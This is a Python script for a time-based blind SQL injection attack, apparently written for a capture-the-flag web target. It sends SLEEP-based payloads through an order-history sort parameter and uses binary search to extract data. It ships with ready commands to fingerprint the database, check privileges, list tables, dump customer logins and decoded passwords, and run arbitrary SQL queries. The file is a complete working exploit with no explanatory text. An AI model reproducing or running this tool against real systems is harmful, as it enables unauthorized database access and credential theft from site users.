#!/usr/bin/env python3
"""Time-based blind SQLi extractor against carabubu order_history sort param."""
import urllib.request, urllib.parse, ssl, time, sys, base64

BASE = "https://carabubu-srv-hhv34z6f.alfactf.ru"
SID = "<PHPSESSID-from-your-logged-in-customer-session>"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

cookie = f"PHPSESSID={SID}"

DELAY = 2.0
THRESHOLD = 1.4

def time_query(payload, retries=2):
    """Send sort=payload and return wall-clock time."""
    qs = urllib.parse.urlencode({
        "order_history": "yes",
        "search": "1",
        "sort": payload,
    })
    url = f"{BASE}/index.php?{qs}"
    best = 999
    for _ in range(retries):
        t0 = time.time()
        try:
            req = urllib.request.Request(url, headers={"Cookie": cookie})
            urllib.request.urlopen(req, timeout=15, context=ctx).read()
        except Exception as e:
            return 999
        dt = time.time() - t0
        if dt < best:
            best = dt
    return best


def sqli_bool(condition_sql):
    """Return True if condition is true (induces SLEEP)."""
    payload = f"(SELECT 1 FROM (SELECT SLEEP(IF({condition_sql},{DELAY},0)))a)"
    dt = time_query(payload, retries=1)
    if dt > THRESHOLD:
        return True
    if dt < THRESHOLD - 0.4:
        return False
    # ambiguous, retry
    dt2 = time_query(payload, retries=1)
    return dt2 > THRESHOLD


def extract_int(query):
    """Extract integer via binary search."""
    # Find magnitude
    hi = 1
    while not sqli_bool(f"({query}) < {hi}"):
        hi *= 2
        if hi > 2**40:
            return None
    lo = hi // 2
    # Now lo <= value < hi
    while lo < hi - 1:
        mid = (lo + hi) // 2
        if sqli_bool(f"({query}) < {mid}"):
            hi = mid
        else:
            lo = mid
    return lo


def extract_byte(query, pos):
    """Extract one byte at 1-based position pos."""
    expr = f"ord(substr(({query}),{pos},1))"
    # Quick check: byte > 0
    if not sqli_bool(f"({expr}) > 0"):
        return 0
    lo, hi = 1, 256
    while lo < hi - 1:
        mid = (lo + hi) // 2
        if sqli_bool(f"({expr}) < {mid}"):
            hi = mid
        else:
            lo = mid
    return lo


def extract_string(query, max_len=200):
    """Extract a string field. Stops on null byte or max_len."""
    out = bytearray()
    for pos in range(1, max_len + 1):
        b = extract_byte(query, pos)
        if b == 0:
            break
        out.append(b)
        sys.stdout.write(f"\rpos={pos:3d} -> {bytes(out)!r}")
        sys.stdout.flush()
    print()
    return bytes(out)


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "info"

    if cmd == "info":
        print("[*] Extracting MySQL version...")
        ver = extract_string("SELECT version()", max_len=40)
        print(f"  version: {ver}")
        print("[*] Extracting current_user...")
        u = extract_string("SELECT current_user()", max_len=80)
        print(f"  user: {u}")
        print("[*] Extracting database()...")
        d = extract_string("SELECT database()", max_len=40)
        print(f"  db: {d}")
        print("[*] Extracting @@datadir...")
        d = extract_string("SELECT @@datadir", max_len=80)
        print(f"  datadir: {d}")
        print("[*] Extracting @@hostname...")
        d = extract_string("SELECT @@hostname", max_len=80)
        print(f"  hostname: {d}")

    elif cmd == "priv":
        print("[*] Checking grants for current_user...")
        # mysql.user.File_priv may not be readable, try alternate
        for grant in ["FILE", "SUPER", "INSERT", "UPDATE", "SELECT"]:
            res = sqli_bool(f"(SELECT count(*) FROM information_schema.user_privileges WHERE privilege_type=0x{grant.encode().hex()}) > 0")
            print(f"  {grant}: {res}")

    elif cmd == "tables":
        print("[*] Listing tables in current DB matching bdvo%...")
        names = extract_string("SELECT GROUP_CONCAT(table_name SEPARATOR 0x0a) FROM information_schema.tables WHERE table_schema=database()", max_len=2000)
        print(names.decode('utf-8', errors='replace'))

    elif cmd == "admins":
        print("[*] Counting customers with actions containing 100...")
        cnt = extract_int("SELECT count(*) FROM bdvo_customers WHERE actions LIKE 0x25313030253b25")
        print(f"  count: {cnt}")
        # Better: actions field is serialized. Look for any record with 100 in actions field
        cnt2 = extract_int("SELECT count(*) FROM bdvo_customers WHERE actions IS NOT NULL AND actions != 0x")
        print(f"  any actions: {cnt2}")
        for i in range(1, (cnt2 or 1) + 1):
            print(f"  -- customer #{i} --")
            login = extract_string(f"SELECT Login FROM bdvo_customers WHERE actions IS NOT NULL AND actions != 0x ORDER BY customerID LIMIT {i-1},1", max_len=60)
            pw = extract_string(f"SELECT cust_password FROM bdvo_customers WHERE actions IS NOT NULL AND actions != 0x ORDER BY customerID LIMIT {i-1},1", max_len=80)
            actions = extract_string(f"SELECT actions FROM bdvo_customers WHERE actions IS NOT NULL AND actions != 0x ORDER BY customerID LIMIT {i-1},1", max_len=400)
            print(f"  Login: {login}")
            try:
                print(f"  Password: {base64.b64decode(pw)}")
            except Exception:
                print(f"  Password (b64): {pw}")
            print(f"  actions: {actions}")

    elif cmd == "raw":
        # Pass an SQL expression as second arg
        sql = sys.argv[2]
        s = extract_string(sql, max_len=int(sys.argv[3]) if len(sys.argv) > 3 else 200)
        print(f"  result: {s}")

    else:
        print(f"unknown cmd {cmd}")
